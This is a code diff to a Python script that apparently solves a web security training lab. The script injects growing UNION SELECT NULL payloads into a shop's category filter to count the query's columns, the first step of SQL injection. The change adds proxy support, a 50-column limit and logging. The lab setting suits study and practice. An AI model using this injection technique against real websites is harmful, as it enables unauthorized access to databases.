@@ -23,14 +23,21 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def main(args):
     shop = Shop(args.url, args.no_proxy)
     nulls_list = ["NULL"]
-    for i in range(2,51):
+    while True:
         nulls = ",".join(nulls_list)
         filter_path = f"filter?category=' UNION SELECT {nulls}-- "
         exploit_url = shop.base_url + filter_path
-        resp = requests.get(shop.base_url + filter_path)
+        if args.no_proxy:
+            resp = requests.get(exploit_url)
+        else:
+            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
         if resp.status_code == 200:
             break
+        if len(nulls_list) > 50:
+            log.error("Could not determine number of columns, > 50.")
+            sys.exit(-1)
         nulls_list.append("NULL")        
+    log.info(f"Number of columns is : {len(nulls_list)}")
     shop.is_solved()
     
 if __name__ == "__main__":
